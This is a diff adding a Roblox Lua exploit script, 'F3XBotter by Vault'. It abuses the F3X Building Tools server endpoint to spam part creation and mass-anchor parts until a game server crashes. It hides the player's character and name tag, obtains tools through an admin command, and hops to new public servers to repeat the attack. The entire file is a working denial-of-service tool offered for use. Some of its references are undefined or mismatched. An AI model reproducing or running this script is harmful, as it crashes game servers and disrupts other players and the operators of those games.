@@ -1,0 +1,124 @@
+local settings = {
+    exploitAmount = 2500
+}
+
+local localPlayer = game:GetService("Players").LocalPlayer
+local runService = game:GetService("RunService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local pingStats = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]
+local tpService = game:GetService("TeleportService")
+local camera = workspace.CurrentCamera
+local exploitSendPost = 0
+local recievePacket = 0
+local lastPacketRecieve = 0
+local collectedParts = false
+
+function draw(drawing, properties)
+    local draw = Drawing.new(drawing)
+
+    for i, v in pairs(properties) do
+        draw[i] = v
+    end
+
+    return draw
+end
+
+local static = draw("Text", {
+    Size = 30,
+    Font = Drawing.Fonts.System,
+    Center = true,
+    Transparency = 1,
+    Visible = true,
+    Outline = true,
+    Color = Color3.fromHex("#5203fc"),
+    Position = Vector2.new(camera.ViewportSize.X / 2, 200)
+})
+
+local f3xVulnability = {
+    parts = {}
+}
+
+function f3xVulnability:collectParts()
+    if not collectedParts then
+        for i, v in next, workspace:GetChildren() do
+            if v:IsA("Part") then
+                f3xVulnability.parts[#f3xVulnability.parts + 1] = { 
+                    ["Part"] = v, ["Anchored"] = false 
+                }
+            end
+        end
+        collectedParts = true
+    end
+end
+
+function f3xVulnability:_1()
+    f3xVulnability:collectParts()
+    localPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer("SyncAnchor", f3xVulnability.parts)
+end
+
+function f3xVulnability:_2()
+    localPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(-3, 50, 70), workspace)
+end
+
+runService:BindToRenderStep("Camera", Enum.RenderPriority.First.Value, function()
+    task.spawn(function()
+        static.Position = Vector2.new(camera.ViewportSize.X / 2, 200)
+        localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 10000, 0)
+        localPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 10000, 0)
+        if localPlayer.Character.HumanoidRootPart:FindFirstChild("OverheadGui") then
+            localPlayer.Character.HumanoidRootPart:FindFirstChild("OverheadGui"):Destroy()
+        end
+        if localPlayer.Character:FindFirstChild("Building Tools") then
+            if localPlayer.Character["Building Tools"]:FindFirstChild("Handle") then
+                localPlayer.Character["Building Tools"].Handle:Destroy()
+            end
+            if exploitSendPost > settings.exploitAmount then
+                f3xVulnability:_1(localPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint)
+            else
+                f3xVulnability:_2(localPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint)
+                exploitSendPost += 1
+                static.Text = ("F3XBotter by Vault | %s/%s"):format(settings.exploitAmount, exploitSendPost)
+            end
+        else
+            if localPlayer.Backpack:FindFirstChild("Building Tools") then
+                localPlayer.Character.Humanoid:EquipTool(localPlayer.Backpack["Boombox"])
+            else
+                replicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";btools")
+            end
+        end
+    end)
+end)
+
+task.spawn(function()
+    while wait(1) do
+        if recievePacket > 20 then
+            if httprequest then
+                local servers = {}
+                local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)})
+                local body = HttpService:JSONDecode(req.Body)
+                if body and body.data then
+                    for i, v in next, body.data do
+                        if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
+                            table.insert(servers, 1, v.id)
+                        end 
+                    end
+                end
+                if #servers > 0 then
+                    tpService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
+                else
+                    static.Text = "Couldn't find server! all server dead ig lol."
+                end
+            end
+        end
+        if pingStats:GetValue() ~= lastPacketRecieve then
+            lastPacketRecieve = pingStats:GetValue()
+        else
+            if recievePacket > 20 then
+                static.Text = ("Server Respone Error Count %s/%s"):format(recievePacket, 20)
+            else
+                static.Text = ("Server Crashed <33")
+            end
+            recievePacket += 1
+        end
+    end
+end)
